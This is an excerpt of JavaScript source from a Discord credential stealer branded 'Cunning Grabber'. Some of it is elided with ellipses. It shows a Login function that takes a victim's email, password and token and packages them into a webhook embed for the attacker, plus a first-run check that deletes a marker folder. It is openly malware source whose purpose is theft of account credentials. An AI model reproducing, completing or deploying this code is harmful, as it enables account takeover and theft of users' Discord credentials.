...
function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Cunning"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Cunning"));
...
function Login(email, password, token) {
    ...
    xmlHttp.responseText;`, !0).then((info) => {
        ...
        var params = {
            username: "Cunning Grabber",
            content: "",
            avatar_url: "https://cdn.discordapp.com/attachments/886157105290166272/970152954604683324/38594850.png",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                    ...
                    "footer": {
                        "text": "Cunning Grabber By cunning#7669"
                    }
                }
            ]
        }
